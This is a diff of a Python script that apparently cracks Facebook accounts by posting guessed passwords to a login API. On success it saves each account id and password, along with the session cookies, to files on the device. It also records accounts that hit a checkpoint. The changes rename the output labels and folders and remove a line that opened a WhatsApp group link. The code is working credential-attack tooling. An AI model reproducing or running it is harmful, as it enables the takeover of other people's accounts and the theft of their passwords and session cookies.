@@ -177,7 +177,6 @@ logo=("""\033[1;93m
 -----------------------------------------------------\033[1;97m""")
 def linex():
     print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
-os.system('xdg-open https://chat.whatsapp.com/JJfccbKpGu9BChyGH7GoLA')
 def clear():
         os.system('clear')
         print(logo)
@@ -524,8 +523,8 @@ def api1(ids,names,passlist):
                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                 q = json.loads(po)
                 if 'session_key' in q:
-                    print('\r\r\033[1;32m [MUGHAL-OK] '+ids+' | '+pas+'\033[1;97m')
-                    open('/sdcard/DOD/MUGHAL-OK.txt','a').write(ids+'|'+pas+'\n')
+                    print('\r\r\033[1;32m [TABISH-OK] '+ids+' | '+pas+'\033[1;97m')
+                    open('/sdcard/TXO/MUGHAL-OK.txt','a').write(ids+'|'+pas+'\n')
                     coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                     open('/sdcard/TXO/TABISH-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                     oks.append(ids)
@@ -533,11 +532,11 @@ def api1(ids,names,passlist):
                 elif 'www.facebook.com' in q['error_msg']:
                     if 'y' in pcp:
                         print('\r\r\x1b[38;5;205m [TABISH-CP] '+ids+' | '+pas+'\033[1;97m')
-                        open('/sdcard/DOD/TABISH-CP.txt','a').write(ids+'|'+pas+'\n')
+                        open('/sdcard/TXO/TABISH-CP.txt','a').write(ids+'|'+pas+'\n')
                         cps.append(ids)
                         break
                     else:
-                        open('/sdcard/DOD/TABISH-CP.txt','a').write(ids+'|'+pas+'\n')
+                        open('/sdcard/TXO/TABISH-CP.txt','a').write(ids+'|'+pas+'\n')
                         break
                 else:
                     continue
